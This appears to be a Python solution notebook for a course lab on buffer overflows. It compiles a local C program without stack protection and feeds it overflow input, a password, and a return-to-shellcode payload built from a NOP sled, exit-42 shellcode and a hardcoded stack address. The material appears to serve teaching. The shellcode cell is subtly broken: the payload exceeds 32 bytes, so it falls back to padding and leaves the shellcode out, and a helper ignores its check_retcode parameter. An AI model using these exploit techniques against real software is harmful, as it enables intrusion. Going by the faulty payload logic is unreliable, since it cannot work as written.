# %%
import subprocess
from typing import Optional


def exec_sh(command: str, timeout: Optional[int | None] = 30, check_retcode=True) -> subprocess.CompletedProcess:
    """
    Execute shell commands with consistent parameters.

    Args:
        command: Shell command to execute (can be multiline)
        timeout: Optional timeout in seconds

    Returns:
        CompletedProcess object with result
    """

    return subprocess.run(command, shell=True, capture_output=True, text=True, check=False, timeout=timeout)


"""
## Buffer overflow
"""

if "SOLUTION":
    exploit = "a" * 21 + "\n"

    exec_sh("""cd w2d1; gcc -o first first.c -fno-stack-protector""")

    run = subprocess.Popen(
        ["cd w2d1; ./first"],
        shell=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    stdout, stderr = run.communicate(input=exploit)
    if run.returncode == 0:
        print("Exploit executed successfully!")
        print("Output:", stdout)
    else:
        print("Exploit failed with return code:", run.returncode)
        print("Output:", stdout)
        print("Error:", stderr)
        exit(1)

# %%
"""
## 
"""
if "SOLUTION":
    password = "secret123"

    exec_sh("""cd w2d1; gcc -o first first.c -fno-stack-protector""")

    run = subprocess.Popen(
        ["cd w2d1; ./first"],
        shell=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    stdout, stderr = run.communicate(input=password)
    if run.returncode == 0:
        print("Exploit executed successfully!")
        print("Output:", stdout)
    else:
        print("Exploit failed with return code:", run.returncode)
        print("Output:", stdout)
        print("Error:", stderr)
        exit(1)

# %%
# Alternative: Simpler approach using return-to-shellcode with known address
if "SOLUTION - Return to Shellcode (Educational Version)":
    import struct

    exec_sh("""cd w2d1; gcc -o first first.c -fno-stack-protector -z execstack -no-pie -g""")

    # Even simpler shellcode - just exit with code 42 to prove code execution
    # This avoids null bytes and is easier to debug
    exit_shellcode = (
        b"\x48\x31\xff"  # xor rdi, rdi
        b"\x48\x83\xc7\x2a"  # add rdi, 42  (exit code 42)
        b"\x48\x31\xc0"  # xor rax, rax
        b"\x48\x83\xc0\x3c"  # add rax, 60  (sys_exit)
        b"\x0f\x05"  # syscall
    )

    # Calculate exact offsets
    # password: 16 bytes
    # authorized: 4 bytes
    # padding for alignment: 4 bytes
    # saved rbp: 8 bytes
    # Total: 32 bytes to overwrite return address

    # Build exploit
    nop_sled = b"\x90" * 100
    buffer_content = nop_sled + exit_shellcode
    padding_needed = 32 - len(buffer_content)

    if padding_needed > 0:
        buffer_content += b"A" * padding_needed
    else:
        # Shellcode is too big for buffer, put it after
        buffer_content = b"A" * 32

    # For educational purposes, we'll use a fixed address
    # In real exploitation, you'd need to defeat ASLR or leak addresses
    # Common stack addresses on x86_64 Linux (when ASLR is off):
    stack_addr = 0x7FFFFFFFE000

    # Point return address into our NOP sled
    ret_addr = struct.pack("<Q", stack_addr)

    exploit = buffer_content + ret_addr + b"\n"

    print("Running exit shellcode exploit...")
    print("Shellcode will exit with code 42 if successful")
    print(f"Exploit length: {len(exploit)} bytes")

    # Save and run
    with open("exploit2.bin", "wb") as f:
        f.write(exploit)

    result = exec_sh("cd w2d1; ./first < exploit2.bin", timeout=1, check_retcode=False)

    if result.returncode == 42:
        print("SUCCESS! Shellcode executed - program exited with code 42")
    else:
        print(f"Program exited with code: {result.returncode}")

    print("Output:", result.stdout)
    if result.stderr:
        print("Error:", result.stderr)
# %%
